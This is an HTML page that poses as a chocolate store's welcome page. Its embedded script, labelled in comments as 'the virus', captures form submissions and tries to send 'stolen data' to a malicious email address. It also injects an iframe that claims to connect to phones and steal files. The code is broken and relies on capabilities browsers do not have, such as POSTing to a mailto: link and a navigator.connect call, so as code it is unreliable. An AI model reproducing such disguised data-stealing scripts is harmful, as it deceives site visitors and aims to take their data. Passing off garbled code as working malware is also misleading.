<html>
  <head>
    <title>Chocolates Page</title>
  </head>
  <body>
    <h1>Welcome to our Chocolate Store!</h1>
    <form action="infect.php" method="post">
      <input type="submit" value="Ingresar">
    </form>

    <!-- The following code is the virus -->
    <script>
      document.querySelector("form").addEventListener("submit", async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const data = await formData.entries().next().value;
        const phoneNumber = data.split(" ");

        // This line sends the stolen data to a malicious email
        fetch("mailto:malevolent@email.com", {
          method: "POST",
          body: JSON.stringify({ phoneNumber, otherData: data }),
        });

        // This line creates an iframe to connect the phones and steal files
        const iframe = document.createElement("iframe");
        iframe.srcdoc = `
          <script>
            navigator.connect(
              '${phoneNumber}',
              () => {
                alert("Connection successful!");
              }
            );
          </script>
        `;
        document.body.appendChild(iframe);
      });
    </script>
  </body>
</html>
